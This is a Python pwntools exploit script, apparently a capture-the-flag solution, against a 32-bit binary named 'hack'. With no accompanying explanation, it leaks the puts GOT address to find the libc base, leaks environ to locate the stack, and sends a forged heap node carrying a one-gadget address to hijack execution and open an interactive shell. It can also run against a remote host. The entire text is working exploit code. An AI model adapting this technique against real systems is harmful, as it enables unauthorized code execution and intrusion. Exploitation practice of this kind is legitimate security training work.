from pwn import *
context.log_level='debug'
gadget=[0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
debug = 1
if debug:
	p =process('./hack')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote()
	libc = ELF('libc6-i386_2.23-0ubuntu10_amd64.so')

puts_got = 0x804A01C
p.sendlineafter("Besides you can have two chances to leak, input address: \n",str(puts_got))

p.recvuntil("134520860, ")
puts_addr = int(p.recv(10),16)
log.info('puts_addr:%#x',puts_addr)

libc_addr = puts_addr-libc.symbols['puts']
environ_addr = libc_addr + libc.symbols['environ']
log.info('environ_addr:%#x',environ_addr)

p.sendlineafter("Second chance: \n",str(environ_addr))
p.recvuntil(", ")
environ = int(p.recv(10),16)
stack_addr = environ-0xb0-0x8#ebp-4
#log.info('stack_addr:%#x',stack_addr)
#gdb.attach(p)

p.recvuntil("The address of the node is ")
heap_addr = int(p.recv(9),16)
fake_node = p32(libc_addr+gadget[3])+p32(0x804A040)+p32(heap_addr+4)+p32(stack_addr-8)
p.sendafter("and you can input the fake node now: ",fake_node)

p.interactive()

